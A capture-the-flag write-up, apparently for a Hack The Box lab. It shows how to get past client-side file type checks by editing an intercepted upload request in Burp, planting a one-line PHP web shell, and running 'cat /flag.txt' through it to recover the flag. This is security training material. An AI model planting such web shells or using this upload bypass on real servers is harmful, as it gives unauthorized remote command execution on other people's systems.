## Challenge

Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice) 

## Solution

Upload an image to the web page, and intercept that request with Burp.

Send the request to the Repeater.

Change the filename to a file with the `php` extension such as `shell.php`.

On the body of the request, remove the part that was of the image, and put the web shell:

```php
<?php system($_REQUEST['cmd']); ?>
```

Send the request and I see the message `File successfully uploaded`.

Right click on the image that you previously oploaded and open it on a new tab, and you will see the link to the path of the image:

`http://94.237.50.230:59494/profile_images/cat.jpg`

So now we know that the shell is on this location, so visit it at `/profile_images/shell.php` and add hte parameters to read the flag.

```sh
http://94.237.50.230:59494/profile_images/shell.php?cmd=cat /flag.txt
```

And the result is `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`.